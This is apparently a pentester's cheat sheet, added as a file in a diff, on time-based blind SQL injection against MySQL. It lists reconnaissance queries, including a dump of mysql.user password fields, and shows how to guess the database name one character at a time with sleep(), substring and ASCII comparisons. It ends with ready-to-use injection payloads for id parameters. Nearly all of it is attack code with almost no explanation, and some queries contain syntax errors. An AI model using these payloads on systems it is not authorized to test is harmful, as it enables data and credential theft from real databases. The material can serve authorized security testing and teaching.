@@ -1,0 +1,121 @@
+Mysql Command Line Interface:[CLI]
+-----------------------------------------------
+mysql> select version();
+mysql> select database();
+mysql> select user();
+mysql> select current_user();
+mysql> select @@datadir;
+mysql> select @@tmpdir;
+mysql> show grants;
+mysql> select * from mysql.user;
+mysql> user,password,host,authentication_string from mysql.user;
+
+----------------------length()-----------------
+mysql> select (length(database()));
+mysql> select (substring(database(),1,1));----> first letter
+mysql> select (substring(database(),2,1));----> second letter
+mysql> select (substring(database(),3,1));----> third letter
+mysql> select (substring(database(),4,1));----> fourth letter
+mysql> select (substring(database(),5,1));----> fifth letter
+mysql> select (substring(database(),6,1));----> sixth letter
+
+--------------------version--------------------
+mysql> select (version() like '5%');----1 means YES 
+mysql> select (version() like '6%');----0 means NO
+mysql> select (version() like '7%');
+mysql> select (version() like '10%');
+
+-------------------user-------------------------
+mysql> select user() like 'root%';
+mysql> select user() like '%root%';
+mysql> select user() like '%admin%';
+mysql> select user() like 'admin%';
+
+------------------if and sleep()---------------------
+mysql> select if (1=1, sleep(5), NULL);
+mysql> select if (1=2, sleep(5), NULL);
+mysql> select if (1=2, sleep(5), NULL);
+mysql> select if ((select database())='security'),sleep(10),NULL);
+mysql> select if ((select database())='mysql'),sleep(10),NULL);
+
+------------------substring to find the letters----------
+mysql> select (length(database()));
+mysql> select (length(database())=4);
+mysql> select (length(database())=5);
+mysql> select (length(database())=7);
+
+mysql> select (database()='security');
+mysql> select (database()='mysql');
+mysql> select if ((database()='security'),sleep(10),NULL)
+mysql> select if ((database()='mysql'),sleep(10),NULL)
+
+mysql> select (substr(database(),1,1)='s');----1 means YES
+mysql> select (substr(database(),1,1)='t');----0 means NO
+mysql> select (substr(database(),1,1)='n');
+mysql> select (substr(database(),1,1)='m');
+mysql> select (substr(database(),2,1)='y');
+mysql> select (substr(database(),3,1)='s');
+mysql> select (substr(database(),4,1)='q');
+mysql> select (substr(database(),5,1)='l');
+
+---------www.asciitable.com-----------------------
+0 means ----NO
+1 means ----YES
+mysql> select ascii (substring(database(),1,1))=115;----->s
+mysql> select ascii (substring(database(),1,1))=116;------> t
+mysql> select ascii (substring(database(),1,1))=110;--------> n
+
+database_name: security: 115 - 101 - 99 - 117 - 114 - 105 - 116 - 121
+database_name: mysql: 109 - 121 - 115- 113 - 108
+
+mysql> select ascii (substring(database(),1,1))=109;--->m
+mysql> select ascii (substr(database(),2,1))=121;-------->y
+mysql> select ascii (substring(database(),3,1))=115;----->s
+mysql> select ascii (substring(database(),4,1))=113;---->q
+mysql> select ascii (substring(database(),5,1))=108;-------->l
+
+-------------------Sleep()--------------------------
+mysql> select 100 from (select (sleep(10))) A;
+mysql> select 100 from (select (sleep(10))) master;
+mysql> select 100 from (select (sleep(10))) pentesthandbook;
+
+--------------------Boolean------------------------
+mysql> select if(1=1,sleep(10),NULL);
+mysql> select if ((1=1 AND 2=2),sleep(10),NULL);
+mysql> select if ((1=1 AND 2=5),sleep(10),NULL);
+
+mysql> select if ((1=1 OR 2=5),sleep(10),NULL);
+mysql> select if ((1=1 OR 2=2),sleep(10),NULL);
+mysql> select if ((1=3 OR 2=8),sleep(10),NULL);
+
+mysql> select if((1=2 XOR 10>9),sleep(10),NULL);
+mysql> select if((1=1 XOR 10>9),sleep(10),NULL);
+mysql> select if(((1=2 XOR 10>9) XOR 10>=8),sleep(10),NULL);
+mysql> select if(((1=2 XOR 5>9) XOR 10>=8),sleep(10),NULL);
+
+---------------some payloads------------------------------
+id=1 AND (select 100 from (select (sleep(10)))pentest)
+id=0 OR (select 100 from (select (sleep(10)))pentest)
+id=0 XOR (select 100 from (select (sleep(10)))pentest)
+
+id=1' AND (select 100 from (select (sleep(10)))pentest) -- -
+id=0 OR (select 100 from (select (sleep(10)))pentest) -- -
+id=0 XOR (select 100 from (select (sleep(10)))pentest) -- -
+
+id=1' AND (select 100 from (select (sleep(10)))pentest) #
+id=0 OR (select 100 from (select (sleep(10)))pentest) #
+id=0 XOR (select 100 from (select (sleep(10)))pentest) #
+
+id=1' AND if (1=1,sleep(10),0) --+
+
+
+
+
+
+
+
+
+
+
+
+
